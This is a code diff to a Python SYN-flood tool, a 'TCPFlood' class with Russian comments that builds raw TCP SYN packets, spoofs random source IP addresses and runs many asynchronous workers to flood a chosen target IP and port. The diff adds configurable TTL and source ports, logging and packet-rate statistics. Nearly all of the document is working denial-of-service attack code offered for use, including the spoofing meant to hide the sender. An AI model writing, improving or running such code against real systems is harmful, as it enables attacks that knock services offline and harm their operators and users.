@@ -5,24 +5,31 @@ import asyncio
 import struct
 import time
 from typing import Optional
+import logging
 from colorama import Fore, Style
+
+logger = logging.getLogger(__name__)
 
 
 class TCPFlood:
-    """TCP Flood атака с поддержкой спуфинга IP"""
+    """TCP Flood атака с поддержкой спуфинга IP и настройки TTL."""
     
     def __init__(self, target_ip: str, target_port: int, workers: int = 100,
-                 spoof_ip: bool = False, packet_size: int = 1024):
+                 spoof_ip: bool = False, packet_size: int = 1024,
+                 source_port: int = 0, ttl: int = 64):
         self.target_ip = target_ip
         self.target_port = target_port
         self.workers = workers
         self.spoof_ip = spoof_ip
         self.packet_size = packet_size
+        self.source_port = source_port if source_port > 0 else None
+        self.ttl = ttl
         
         self.sent_packets = 0
         self.sent_bytes = 0
         self._running = False
         self._tasks = []
+        self._start_time = 0
         
         # Для спуфинга IP
         self.source_ips = []
@@ -30,14 +37,14 @@ class TCPFlood:
             self.generate_spoof_ips()
     
     def generate_spoof_ips(self):
-        """Генерация случайных IP адресов для спуфинга"""
+        """Генерация случайных IP адресов для спуфинга."""
         for _ in range(100):  # Генерируем пул IP
             ip = f"{random.randint(1, 254)}.{random.randint(0, 255)}." \
                  f"{random.randint(0, 255)}.{random.randint(1, 254)}"
             self.source_ips.append(ip)
     
     def craft_syn_packet(self, source_ip: str, source_port: int) -> bytes:
-        """Создание TCP SYN пакета"""
+        """Создание TCP SYN пакета с учётом TTL."""
         # IP заголовок
         ip_ihl = 5
         ip_ver = 4
@@ -45,7 +52,7 @@ class TCPFlood:
         ip_tot_len = 20 + 20  # IP + TCP заголовки
         ip_id = random.randint(0, 65535)
         ip_frag_off = 0
-        ip_ttl = 255
+        ip_ttl = self.ttl  # Используем заданный TTL
         ip_proto = socket.IPPROTO_TCP
         ip_check = 0
         ip_saddr = socket.inet_aton(source_ip)
@@ -127,7 +134,7 @@ class TCPFlood:
         return ip_header + tcp_header
     
     def checksum(self, msg: bytes) -> int:
-        """Вычисление checksum для пакета"""
+        """Вычисление checksum для пакета."""
         s = 0
         for i in range(0, len(msg), 2):
             w = (msg[i] << 8) + (msg[i + 1] if i + 1 < len(msg) else 0)
@@ -138,22 +145,34 @@ class TCPFlood:
         return s
     
     async def flood_worker(self, worker_id: int):
-        """Воркер для отправки TCP пакетов"""
+        """Воркер для отправки TCP пакетов."""
+        sock = None
         try:
-            # Создаем raw socket
+            # Создаём raw socket
             sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
             sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
             
-            source_port = random.randint(1024, 65535)
+            # Устанавливаем TTL если не используем спуфинг
+            if not self.spoof_ip:
+                sock.setsockopt(socket.IPPROTO_IP, socket.IP_TTL, self.ttl)
+            
+            # Определяем source port
+            if self.source_port:
+                base_port = self.source_port
+            else:
+                base_port = random.randint(1024, 65535)
             
             while self._running:
+                # Небольшая вариация порта
+                source_port = base_port + random.randint(0, 100)
+                
                 # Выбираем source IP
                 if self.spoof_ip and self.source_ips:
                     source_ip = random.choice(self.source_ips)
                 else:
                     source_ip = "127.0.0.1"  # Локальный для тестов
                 
-                # Создаем и отправляем пакет
+                # Создаём и отправляем пакет
                 packet = self.craft_syn_packet(source_ip, source_port)
                 
                 try:
@@ -162,10 +181,10 @@ class TCPFlood:
                     self.sent_bytes += len(packet)
                     
                     # Вывод статистики каждые 1000 пакетов
-                    if self.sent_packets % 1000 == 0:
-                        elapsed = time.time() - getattr(self, '_start_time', time.time())
+                    if self.sent_packets % 1000 == 0 and worker_id == 0:
+                        elapsed = time.time() - self._start_time
                         pps = int(self.sent_packets / elapsed) if elapsed > 0 else 0
-                        print(f"\r{Fore.WHITE}📦 Sent: {self.sent_packets:,} | "
+                        print(f"\r{Fore.WHITE}📦 Packets: {self.sent_packets:,} | "
                               f"⚡ PPS: {pps:,} | "
                               f"📊 {self.sent_bytes / 1024 / 1024:.1f} MB{Style.RESET_ALL}", end="")
                 
@@ -173,29 +192,35 @@ class TCPFlood:
                     await asyncio.sleep(0.001)
                     continue
                 
-                # Небольшая задержка для избежания полной блокировки event loop
+                # Небольшая задержка
                 await asyncio.sleep(0.0001)
         
         except PermissionError:
+            logger.error(f"Permission denied: need root/admin privileges for raw sockets")
             print(f"{Fore.RED}❌ Permission denied: need root/admin privileges for raw sockets{Style.RESET_ALL}")
-            print(f"{Fore.YELLOW}⚠️  Try without --spoof-ip flag or run as administrator{Style.RESET_ALL}")
         except Exception as e:
             if self._running:
-                print(f"{Fore.RED}[Worker {worker_id}] Error: {e}{Style.RESET_ALL}")
+                logger.error(f"Worker {worker_id} error: {e}")
         finally:
-            try:
-                sock.close()
-            except:
-                pass
+            if sock:
+                try:
+                    sock.close()
+                except:
+                    pass
     
     async def start(self):
-        """Запуск TCP флуда"""
+        """Запуск TCP флуда."""
         self._running = True
         self._start_time = time.time()
         
         print(f"{Fore.CYAN}🚀 Starting {self.workers} TCP flood workers...{Style.RESET_ALL}")
+        print(f"{Fore.CYAN}🎯 Target: {self.target_ip}:{self.target_port}{Style.RESET_ALL}")
+        print(f"{Fore.CYAN}📦 Packet size: {self.packet_size} bytes{Style.RESET_ALL}")
+        print(f"{Fore.CYAN}📡 TTL: {self.ttl}{Style.RESET_ALL}")
+        if self.source_port:
+            print(f"{Fore.CYAN}🔌 Source port: {self.source_port}{Style.RESET_ALL}")
         
-        # Создаем задачи для воркеров
+        # Создаём задачи для воркеров
         self._tasks = []
         for i in range(self.workers):
             task = asyncio.create_task(self.flood_worker(i))
@@ -208,7 +233,7 @@ class TCPFlood:
             pass
     
     def stop(self):
-        """Остановка атаки"""
+        """Остановка атаки."""
         self._running = False
         
         # Отменяем все задачи
@@ -218,3 +243,8 @@ class TCPFlood:
         print(f"\n{Fore.GREEN}✅ TCP Flood stopped{Style.RESET_ALL}")
         print(f"📊 Total packets: {self.sent_packets:,}")
         print(f"💾 Total data: {self.sent_bytes / 1024 / 1024:.2f} MB")
+        
+        if self._start_time > 0:
+            elapsed = time.time() - self._start_time
+            avg_pps = int(self.sent_packets / elapsed)
+            print(f"⚡ Average PPS: {avg_pps:,}")
